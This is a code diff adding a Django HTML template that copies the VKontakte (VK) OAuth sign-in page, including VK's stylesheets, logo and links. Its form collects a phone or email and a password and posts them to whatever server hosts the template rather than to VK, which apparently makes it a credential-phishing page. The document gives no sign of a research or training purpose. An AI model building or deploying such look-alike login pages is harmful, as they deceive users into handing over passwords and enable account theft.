@@ -1,0 +1,48 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>ВКонтакте | Вход</title>
+    <link rel="stylesheet" type="text/css" href="https://vk.com/css/al/common.css?52719122845" /><link rel="stylesheet" type="text/css" href="https://vk.com/css/al/base.css?112134325000" /><link rel="stylesheet" type="text/css" href="https://vk.com/css/al/fonts_utf.css?1" /><link rel="stylesheet" type="text/css" href="https://vk.com/css/al/fonts_cnt.css?7802460376" />
+    <link type="text/css" rel="stylesheet" href="https://vk.com/css/api/oauth_popup.css?30416147263"></link>
+  </head>
+
+  <body class="VK oauth_full">
+    
+    <div class="oauth_wrap">
+      <div class="oauth_wrap_inner">
+        <div class="oauth_wrap_content" id="oauth_wrap_content">
+          <div class="oauth_head">
+  <a class="oauth_logo fl_l" href="https://vk.com" target="_blank"></a>
+  <div id="oauth_head_info" class="oauth_head_info fl_r">
+  <a class="oauth_reg_link" href="https://vk.com/join?reg=1" target="_blank">Регистрация</a>
+</div>
+</div>
+
+<div class="oauth_content box_body clear_fix">
+  <div class="box_msg_gray box_msg_padded">Для продолжения Вам необходимо войти <b>ВКонтакте</b>.</div>
+
+  <form method="POST" id="login_submit">{% csrf_token %}
+    <div class="oauth_form">
+
+      
+
+      <div class="oauth_form_login">
+
+        <div class="oauth_form_header">Телефон или email</div>
+        {{ form.user }}
+        <div class="oauth_form_header">Пароль</div>
+        {{ form.password }}
+
+        <button style="margin-top: 20px;" class="flat_button oauth_button button_wide" id="install_allow" type="submit">Войти</button>
+        <a class="oauth_forgot" href="https://vk.com/restore" target="_blank">Забыли пароль?</a>
+      </div>
+    </div>
+  </form>
+</div>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
